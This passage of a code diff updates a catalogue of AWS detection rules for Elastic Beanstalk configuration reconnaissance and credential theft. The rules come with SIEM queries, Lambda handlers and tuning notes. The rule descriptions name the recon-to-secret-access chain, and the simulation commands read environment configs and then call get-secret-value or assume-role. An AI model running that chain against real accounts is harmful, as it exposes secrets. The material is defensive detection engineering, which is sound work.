+        tuningGuidance: "1. Resolve Beanstalk linkage explicitly. 2. Model approved pivot targets and IAM actions. 3. Escalate further when the originating environment is sensitive or the pivot creates durable access.",
+        whenToFire: "Fire when a Beanstalk-linked principal uses IAM or STS pivots outside approved access paths.",
+      },
+      simulationCommand: "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole --role-session-name test",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and Beanstalk linkage; high with raw name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with Beanstalk and actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is preferred because credential pivots can expand attacker access immediately.",
+        considerations: ["This is the actor-centric Beanstalk privilege-pivot detector.", "Beanstalk linkage and actor authorization are the main dependencies."],
+      },
+    },
   },
 
   // --- Elastic Beanstalk Environment Credential Theft ---
   {
     id: "det-122",
     title: "DescribeConfigurationSettings Visibility",
-    description: "Baseline visibility for environment configuration retrieval. This can be legitimate read-only administration, but it is a sensitive recon API because config may contain secrets or secret references.",
+    description: "Baseline visibility for Elastic Beanstalk environment configuration retrieval. This is a sensitive reconnaissance API because configuration settings may expose secrets, references, or trust paths used in later credential abuse.",
     awsService: "Elastic Beanstalk",
     relatedServices: ["IAM"],
     severity: "Medium",
@@ -13759,16 +16015,95 @@ ORDER BY eventTime DESC`,
 | filter eventName = "DescribeConfigurationSettings"
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
+      lambda: `"""
+DescribeConfigurationSettings Visibility
+Trigger: EventBridge rule matching DescribeConfigurationSettings.
+Use for: Baseline visibility into Elastic Beanstalk configuration reads.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "elasticbeanstalk.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DescribeConfigurationSettings":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": True,
+        "alert": {
+            "rule_id": "det-122",
+            "title": "DescribeConfigurationSettings Visibility",
+            "severity": "Medium",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "application_name": request.get("applicationName"),
+            "environment_name": request.get("environmentName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and target app/environment.", "Verify if config read was authorized.", "Check for follow-on credential use."],
-    testingSteps: ["Call DescribeConfigurationSettings.", "Verify CloudTrail captures the event.", "Run the detection."],
+    investigationSteps: ["Identify the actor and the application or environment whose configuration was read.", "Verify whether the read was expected for that environment and actor role.", "Check for broad enumeration or follow-on IAM, STS, Secrets Manager, or KMS activity."],
+    testingSteps: ["Call `DescribeConfigurationSettings` against a test Elastic Beanstalk environment.", "Verify CloudTrail captures the application and environment context.", "Run the baseline rule and confirm it records all environment-configuration reads."],
+    lifecycle: {
+      whyItMatters: "Beanstalk configuration reads are often the first step in credential or trust-path discovery. Even when legitimate, they are valuable reconnaissance telemetry.",
+      threatContext: {
+        attackerBehavior: "An attacker may inspect Beanstalk configuration settings to identify secrets, environment variables, role references, or other useful pivot material.",
+        realWorldUsage: "This is attractive because it uses a read-only administrative API that may appear benign in environments with limited Beanstalk monitoring.",
+        whyItMatters: "This baseline event feeds stronger detections about unauthorized readers, burst enumeration, and recon-to-action sequences.",
+        riskAndImpact: "If missed, defenders may overlook the earliest stage of Beanstalk-derived credential theft.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["CloudTrail must ingest Elastic Beanstalk management events.", "The platform should retain application and environment context.", "Follow-on IAM, STS, and secrets events should be available for downstream correlation."],
+        limitations: ["The API does not by itself prove that secrets were exposed or abused.", "Legitimate application and platform administrators may use it regularly.", "A single read is lower confidence without actor or follow-on context."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor reading Beanstalk configuration" },
+          { rawPath: "requestParameters.applicationName", normalizedPath: "aws.elasticbeanstalk.application.name", notes: "Application being inspected" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Environment being inspected" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "DescribeConfigurationSettings", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/admin", type: "IAMUser" },
+          aws: { elasticbeanstalk: { application: { name: "my-app" }, environment: { name: "prod" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Environment Sensitivity", description: "Classify the Beanstalk environment by privilege exposure and business criticality.", examples: ["prod app env", "internal tooling env"], falsePositiveReduction: "Improves prioritization of configuration reads." },
+        { dimension: "Actor Authorization", description: "Determine whether the actor normally administers or inspects Beanstalk configuration.", examples: ["platform admin", "unexpected app role"], falsePositiveReduction: "Turns baseline visibility into stronger actor-based detections." },
+        { dimension: "Potential Secret Exposure", description: "Assess whether the environment is known to carry secrets or secret references in config.", examples: ["DB credentials in env vars", "secret manager references"], falsePositiveReduction: "Raises urgency when the read likely exposes useful material." },
+      ],
+      logicExplanation: {
+        humanReadable: "This should remain a broad visibility rule for successful `DescribeConfigurationSettings` events. It establishes the Beanstalk recon baseline that stronger actor, burst, and recon-to-action detections depend on.",
+        conditions: ["eventSource equals elasticbeanstalk.amazonaws.com", "eventName equals DescribeConfigurationSettings", "errorCode is absent"],
+        tuningGuidance: "1. Keep this baseline broad. 2. Resolve environment sensitivity and actor context for triage. 3. Correlate with later IAM, STS, or secrets access for higher-confidence detections.",
+        whenToFire: "Fire on every successful DescribeConfigurationSettings event for visibility.",
+      },
+      simulationCommand: "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name prod",
+      quality: {
+        signalQuality: 6,
+        falsePositiveRate: "Medium as a baseline visibility rule, low-medium with environment and actor context",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda", "Athena", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful for chaining into follow-on credential-theft detections.",
+        considerations: ["This is the feeder rule for the Beanstalk credential-theft family.", "Environment sensitivity and actor context are the main enrichments."],
+      },
+    },
   },
   {
     id: "det-123",
-    title: "DescribeConfigurationSettings by Unexpected Actor",
-    description: "Detects sensitive configuration reads by identities that normally should not inspect Beanstalk environment settings. Suspicious: IAM users outside app/platform admin, application roles without Beanstalk admin, unusual assumed roles.",
+    title: "DescribeConfigurationSettings Outside Authorized Beanstalk Access Path",
+    description: "Detects Beanstalk configuration reads by identities outside approved application-platform or deployment workflows. This should rely on explicit actor authorization, not role-name substring allowlists.",
     awsService: "Elastic Beanstalk",
     relatedServices: ["IAM"],
     severity: "High",
@@ -13784,42 +16119,107 @@ detection:
   selection:
     eventSource: elasticbeanstalk.amazonaws.com
     eventName: DescribeConfigurationSettings
-  filter_known:
-    userIdentity.arn|contains:
-      - '/role/Admin'
-      - '/role/Platform'
-      - '/role/Beanstalk'
-      - '/role/App'
-  condition: selection and not filter_known
+  condition: selection
 level: high`,
       splunk: `index=aws sourcetype=aws:cloudtrail eventSource=elasticbeanstalk.amazonaws.com eventName=DescribeConfigurationSettings
-| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Beanstalk%") OR like(userIdentity.arn, "%/role/App%"))
 | table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress`,
       cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress
 FROM cloudtrail_logs
 WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
   AND eventName = 'DescribeConfigurationSettings'
-  AND userIdentity.arn NOT LIKE '%/role/Admin%'
-  AND userIdentity.arn NOT LIKE '%/role/Platform%'
-  AND userIdentity.arn NOT LIKE '%/role/Beanstalk%'
-  AND userIdentity.arn NOT LIKE '%/role/App%'
 ORDER BY eventTime DESC`,
       cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName
 | filter eventSource = "elasticbeanstalk.amazonaws.com"
 | filter eventName = "DescribeConfigurationSettings"
-| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|Beanstalk|App)/
 | sort @timestamp desc`,
       eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
+      lambda: `"""
+DescribeConfigurationSettings Outside Authorized Beanstalk Access Path
+Trigger: EventBridge rule matching DescribeConfigurationSettings.
+Use for: Authorization checks on Beanstalk configuration reads.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "elasticbeanstalk.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DescribeConfigurationSettings":
+        return {"matched": False}
+
+    return {
+        "matched": "requires-authorized-beanstalk-config-reader-check",
+        "alert": {
+            "rule_id": "det-123",
+            "title": "DescribeConfigurationSettings Outside Authorized Beanstalk Access Path",
+            "severity": "High",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for Beanstalk config.", "Update allowlist if legitimate."],
-    testingSteps: ["As non-Beanstalk role, call DescribeConfigurationSettings.", "Verify detection triggers."],
+    investigationSteps: ["Identify the actor, session issuer, and source IP behind the configuration read.", "Verify whether this identity is explicitly approved to inspect Beanstalk configuration for the target environment.", "Determine whether the read came from trusted deployment automation or an unexpected application or workload principal."],
+    testingSteps: ["As an identity outside the approved Beanstalk-reader set, call `DescribeConfigurationSettings` against a monitored environment.", "Verify CloudTrail records the actor and environment context.", "Run the detector and confirm it relies on explicit authorization rather than role-name text matching."],
+    lifecycle: {
+      whyItMatters: "Only a limited set of identities should inspect Beanstalk configuration in many environments. When an unapproved actor performs that read, it is a strong signal of reconnaissance for credential or trust-path discovery.",
+      threatContext: {
+        attackerBehavior: "An attacker operating through a compromised app role, developer identity, or unusual assumed role may read Beanstalk configuration to harvest secrets or pivot material.",
+        realWorldUsage: "This is attractive because the API is read-oriented and may be overlooked compared to overt write actions.",
+        whyItMatters: "Authorization context matters more than whether a role name looks platform-like or app-like.",
+        riskAndImpact: "If missed, unauthorized actors may quietly map Beanstalk environments before moving into credential theft or IAM abuse.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk", "Authorized Beanstalk-reader inventory"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["DescribeConfigurationSettings events must be ingested with full actor context.", "The environment should maintain exact principals allowed to inspect Beanstalk configuration.", "Workflow provenance for deployments or automation should be modeled explicitly."],
+        limitations: ["Without actor inventories the rule becomes weak anomaly detection.", "Some legitimate automation may perform reads under generic-looking roles.", "The read alone does not prove malicious use of any discovered material."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing the configuration read" },
+          { rawPath: "userIdentity.sessionContext.sessionIssuer.arn", normalizedPath: "aws.identity.session_issuer.arn", notes: "Underlying role where relevant" },
+          { rawPath: "requestParameters.applicationName", normalizedPath: "aws.elasticbeanstalk.application.name", notes: "Application being inspected" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Environment being inspected" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "DescribeConfigurationSettings", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session", type: "AssumedRole" },
+          aws: { elasticbeanstalk: { application: { name: "my-app" }, environment: { name: "prod" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Authorized Config Readers", description: "Exact inventory of identities allowed to inspect Beanstalk configuration.", examples: ["platform admin role", "approved deployment automation"], falsePositiveReduction: "Replaces brittle role-name allowlists." },
+        { dimension: "Workflow Provenance", description: "Determine whether the read came from a trusted deployment or support workflow.", examples: ["deployment pipeline", "manual unknown session"], falsePositiveReduction: "Separates expected automation from suspicious recon." },
+        { dimension: "Environment Sensitivity", description: "Classify the target Beanstalk environment by criticality and secret exposure.", examples: ["prod app env", "internal admin env"], falsePositiveReduction: "Improves prioritization of suspicious reads." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect Beanstalk configuration reads outside approved access paths. It should match `DescribeConfigurationSettings`, resolve the actor and workflow provenance, and then check whether that identity is explicitly allowed to inspect the target environment's configuration.",
+        conditions: ["eventSource equals elasticbeanstalk.amazonaws.com", "eventName equals DescribeConfigurationSettings", "actor is not in the approved Beanstalk-reader inventory or request lacks approved workflow provenance or actor is outside approved environment scope"],
+        tuningGuidance: "1. Use exact actor inventories. 2. Model environment scope for readers. 3. Escalate further when the environment is sensitive or the actor later performs privileged actions.",
+        whenToFire: "Fire when Beanstalk configuration is read by an identity outside approved access paths.",
+      },
+      simulationCommand: "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name prod --profile dev-user",
+      quality: {
+        signalQuality: 8,
+        falsePositiveRate: "Low-Medium with actor inventories and workflow provenance; high with role-name heuristics",
+        expectedVolume: "Low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["EventBridge + Lambda enrichment", "Athena with actor inventories", "Splunk", "Panther / Chronicle / Datadog"],
+        scheduling: "Real-time is useful because unauthorized Beanstalk recon may quickly lead to credential theft.",
+        considerations: ["This is the actor-centric Beanstalk recon detector.", "Actor authorization and workflow provenance are the main dependencies."],
+      },
+    },
   },
   {
     id: "det-124",
     title: "Burst or Broad Environment Enumeration",
-    description: "Detects reconnaissance across multiple applications/environments. Repeated DescribeConfigurationSettings by same actor across many app/environment names in a short period. Legitimate use is often narrow; attackers tend to enumerate broadly.",
+    description: "Detects broad or burst Elastic Beanstalk environment enumeration. Attackers often inspect many applications or environments in a short window rather than reading a single known target.",
     awsService: "Elastic Beanstalk",
     relatedServices: ["IAM"],
     severity: "High",
@@ -13862,13 +16262,66 @@ ORDER BY distinct_envs DESC`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { applicationName: "app1", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify the actor and enumeration scope.", "Verify if broad enumeration was authorized.", "Check for follow-on credential use."],
-    testingSteps: ["Call DescribeConfigurationSettings for >5 distinct app+env in 15 min.", "Run threshold query."],
+    investigationSteps: ["Identify the actor, number of distinct applications or environments touched, and the exact window of enumeration.", "Verify whether the breadth of enumeration is consistent with legitimate administration or deployment activity.", "Check for follow-on IAM, STS, Secrets Manager, or KMS actions after the burst."],
+    testingSteps: ["Call `DescribeConfigurationSettings` for more than five distinct application-and-environment pairs within 15 minutes.", "Verify CloudTrail records the broad read pattern.", "Run the threshold detector and confirm it keys on short-window breadth rather than single-event reads."],
+    lifecycle: {
+      whyItMatters: "Broad environment enumeration is one of the clearest signs of active Beanstalk reconnaissance. Attackers often need to discover which environments carry the most useful secrets or trust paths before choosing a pivot target.",
+      threatContext: {
+        attackerBehavior: "An attacker may query many Beanstalk applications and environments in a short period to inventory the available configuration surface.",
+        realWorldUsage: "This is attractive because it quickly maps where useful application credentials or environment variables may exist.",
+        whyItMatters: "Short-window breadth is often a stronger signal than any one configuration read.",
+        riskAndImpact: "If missed, defenders may not recognize an active discovery phase that precedes credential theft or privilege pivoting.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["DescribeConfigurationSettings events must be ingested with accurate timestamps and target context.", "The detection engine must support thresholding or windowed aggregation.", "Actor identity should be normalized across IAM users and assumed roles."],
+        limitations: ["Thresholds may require tuning for environments with large-scale platform administration.", "Some legitimate migration or audit workflows may read many environments in a short window.", "Low-and-slow reconnaissance may avoid threshold-based detection."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor performing repeated configuration reads" },
+          { rawPath: "requestParameters.applicationName", normalizedPath: "aws.elasticbeanstalk.application.name", notes: "Application included in the enumeration" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Environment included in the enumeration" },
+          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Time of each Beanstalk recon event" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "DescribeConfigurationSettings", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/attacker", type: "IAMUser" },
+          aws: { elasticbeanstalk: { application: { name: "app1" }, environment: { name: "prod" } } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Actor History", description: "Determine whether the actor has previously read Beanstalk configurations at this breadth.", examples: ["first-time broad enumeration", "scheduled platform audit"], falsePositiveReduction: "Makes burst breadth more meaningful in context." },
+        { dimension: "Environment Diversity", description: "Classify whether the enumeration spans production, shared services, and admin environments.", examples: ["dev only", "prod plus internal tooling"], falsePositiveReduction: "Raises urgency when broad recon touches sensitive environments." },
+        { dimension: "Post-Burst Activity", description: "Track whether the same actor pivots into IAM, STS, secrets, or KMS actions after the enumeration.", examples: ["AssumeRole after burst", "GetSecretValue after burst"], falsePositiveReduction: "Improves confidence when the burst leads to action." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should detect short-window breadth in Beanstalk environment reconnaissance. It should count distinct application-and-environment targets per normalized actor and fire when the actor exceeds the local threshold inside a 15-minute window.",
+        conditions: ["eventSource equals elasticbeanstalk.amazonaws.com", "eventName equals DescribeConfigurationSettings", "same normalized actor exceeds the distinct app-and-environment threshold in a 15-minute window"],
+        tuningGuidance: "1. Tune thresholds to local Beanstalk administration patterns. 2. Normalize actors across sessions. 3. Escalate when the burst includes sensitive environments or is followed by privileged actions.",
+        whenToFire: "Fire when Beanstalk environment enumeration exceeds the configured breadth threshold in a short time window.",
+      },
+      simulationCommand: "for env in prod stage dev qa test ops; do aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name $env; done",
+      quality: {
+        signalQuality: 7,
+        falsePositiveRate: "Low-Medium with tuned thresholds and actor baselines",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
+        whereItRuns: ["SIEM threshold engines", "Athena scheduled aggregation", "CloudWatch Logs Insights", "Panther / Chronicle / Datadog"],
+        scheduling: "Near-real-time or short scheduled windows work well because the breadth itself is the signal.",
+        considerations: ["This is the burst-and-breadth Beanstalk recon detector.", "Threshold tuning is the main implementation dependency."],
+      },
+    },
   },
   {
     id: "det-125",
     title: "DescribeConfigurationSettings Followed by Privileged Use",
-    description: "High-confidence credential-theft: DescribeConfigurationSettings then shortly afterward same actor or newly activated principal performs CreateAccessKey, AssumeRole, GetSecretValue, S3 or KMS access beyond baseline.",
+    description: "High-confidence Beanstalk recon-to-privileged-use detection. This should correlate configuration reads with later privileged API activity using ordered sequence and stable identity rather than loose event aggregation.",
     awsService: "Elastic Beanstalk",
     relatedServices: ["IAM", "STS", "Secrets Manager", "S3", "KMS"],
     severity: "Critical",
@@ -13890,9 +16343,9 @@ detection:
       - AssumeRole
       - GetSecretValue
       - Decrypt
-  condition: 1 of selection_*
+  condition: selection_beanstalk
 level: critical
-# Full correlation (actor, 30 min) requires SIEM.`,
+# Full correlation requires ordered sequence and stable actor or derived identity linkage.`,
       splunk: `index=aws sourcetype=aws:cloudtrail
   ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=GetSecretValue OR eventName=Decrypt))
 | eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
@@ -13925,18 +16378,99 @@ ORDER BY r.recon_time DESC`,
 | filter cnt > 1
 | sort cnt desc`,
       eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
+      lambda: `"""
+DescribeConfigurationSettings Followed by Privileged Use
+Trigger: EventBridge rule matching DescribeConfigurationSettings.
+Use for: Correlation from Beanstalk configuration reads to later privileged cloud activity.
+"""
+
+def lambda_handler(event, context):
+    detail = event.get("detail", {})
+    if detail.get("eventSource") != "elasticbeanstalk.amazonaws.com":
+        return {"matched": False}
+    if detail.get("eventName") != "DescribeConfigurationSettings":
+        return {"matched": False}
+
+    request = detail.get("requestParameters", {})
+    return {
+        "matched": "requires-beanstalk-recon-plus-privileged-use-correlation",
+        "alert": {
+            "rule_id": "det-125",
+            "title": "DescribeConfigurationSettings Followed by Privileged Use",
+            "severity": "Critical",
+            "actor": detail.get("userIdentity", {}).get("arn"),
+            "application_name": request.get("applicationName"),
+            "environment_name": request.get("environmentName"),
+            "event_time": detail.get("eventTime"),
+        },
+    }
+`,
     },
     relatedAttackSlugs: [],
     telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
-    investigationSteps: ["Identify DescribeConfigurationSettings and privileged use sequence.", "Verify if follow-on activity indicates credential theft.", "Check env config for exposed secrets."],
-    testingSteps: ["Call DescribeConfigurationSettings, then GetSecretValue within 30 min.", "Run Splunk or Athena correlation query."],
+    investigationSteps: ["Identify the configuration read and the exact privileged follow-on activity within the correlation window.", "Determine whether the same normalized actor or a newly activated derived identity performed the later privileged action.", "Assess whether the Beanstalk configuration could have exposed the credentials or trust path used in the follow-on activity."],
+    testingSteps: ["Call `DescribeConfigurationSettings` in a lab environment, then perform `GetSecretValue`, `AssumeRole`, `Decrypt`, or `CreateAccessKey` within 30 minutes.", "Verify both the recon event and later privileged use appear in CloudTrail.", "Run the detector and confirm it requires ordered recon-to-use correlation."],
+    lifecycle: {
+      whyItMatters: "This is one of the clearest Beanstalk credential-theft sequences: environment configuration is read and privileged cloud activity follows soon after.",
+      threatContext: {
+        attackerBehavior: "An attacker may inspect Beanstalk configuration to discover secrets, roles, or token material and then use that information to access secrets, assume roles, decrypt data, or create new credentials.",
+        realWorldUsage: "This is attractive because it turns a read-only admin action into a direct privilege or data-access pivot.",
+        whyItMatters: "The ordered transition from recon into privileged use is much stronger than either side alone.",
+        riskAndImpact: "If missed, defenders may not realize that a configuration read directly enabled privileged cloud activity.",
+      },
+      telemetryValidation: {
+        requiredLogSources: ["AWS CloudTrail management events for Elastic Beanstalk", "AWS CloudTrail management events for IAM, STS, Secrets Manager, and KMS"],
+        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.applicationName", "requestParameters.environmentName", "sourceIPAddress"],
+        loggingRequirements: ["DescribeConfigurationSettings and privileged follow-on events must be ingested into the same analytics environment.", "Actor identity should be normalized across direct and assumed-role sessions.", "Derived identity or role activation context should be available where possible."],
+        limitations: ["Actor-only joins can miss role-activation pivots unless identity normalization is strong.", "Some legitimate admin workflows may read configuration and then perform expected privileged actions.", "The model depends on good local workflow understanding."],
+      },
+      dataModeling: {
+        rawToNormalized: [
+          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor reading configuration and later performing privileged use" },
+          { rawPath: "requestParameters.applicationName", normalizedPath: "aws.elasticbeanstalk.application.name", notes: "Application being inspected" },
+          { rawPath: "requestParameters.environmentName", normalizedPath: "aws.elasticbeanstalk.environment.name", notes: "Environment being inspected" },
+          { rawPath: "follow_on.eventName", normalizedPath: "related.event.action", notes: "Privileged action after Beanstalk recon" },
+        ],
+        exampleNormalizedEvent: JSON.stringify({
+          "@timestamp": "2025-02-10T12:45:00Z",
+          event: { category: ["discovery"], type: ["info"], action: "DescribeConfigurationSettings", outcome: "success", provider: "aws" },
+          user: { arn: "arn:aws:iam::123456789012:user/dev", type: "IAMUser" },
+          aws: { elasticbeanstalk: { application: { name: "my-app" }, environment: { name: "prod" } } },
+          related: { event: { action: "GetSecretValue" } },
+        }, null, 2),
+      },
+      enrichment: [
+        { dimension: "Stable Actor or Derived Identity", description: "Normalize the operator and any derived role path between recon and follow-on privileged use.", examples: ["same IAM user", "same user to assumed role"], falsePositiveReduction: "Improves recon-to-use correlation fidelity." },
+        { dimension: "Environment Secret Exposure", description: "Assess whether the Beanstalk environment likely exposed secret references or privileged trust paths.", examples: ["DB secret refs", "deployment role ARN"], falsePositiveReduction: "Raises confidence that the recon enabled the later action." },
+        { dimension: "Privileged Action Class", description: "Classify the later action as secrets access, role assumption, decrypt, or credential creation.", examples: ["GetSecretValue", "AssumeRole"], falsePositiveReduction: "Makes the post-recon abuse path easier to triage." },
+      ],
+      logicExplanation: {
+        humanReadable: "This rule should model a Beanstalk recon-to-privileged-use chain: an actor reads configuration settings and then performs privileged cloud activity soon afterward. It should require event order and stable actor or derived identity linkage.",
+        conditions: ["first eventSource equals elasticbeanstalk.amazonaws.com and eventName equals DescribeConfigurationSettings", "second event is CreateAccessKey, AssumeRole, GetSecretValue, or Decrypt by the same normalized actor or linked derived identity", "follow-on activity occurs within 30 minutes"],
+        tuningGuidance: "1. Require order. 2. Normalize actor and derived identities carefully. 3. Escalate further when the environment is sensitive or the privileged action is unusual for the actor.",
+        whenToFire: "Fire when Beanstalk configuration reads are followed quickly by privileged cloud activity from the same operator context.",
+      },
+      simulationCommand: "aws elasticbeanstalk describe-configuration-settings --application-name my-app --environment-name prod && aws secretsmanager get-secret-value --secret-id ExampleSecret",
+      quality: {
+        signalQuality: 9,
+        falsePositiveRate: "Low-Medium with ordered correlation and workflow context",
+        expectedVolume: "Very low",
+        productionReadiness: "validated",
+      },
+      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
+      deployment: {
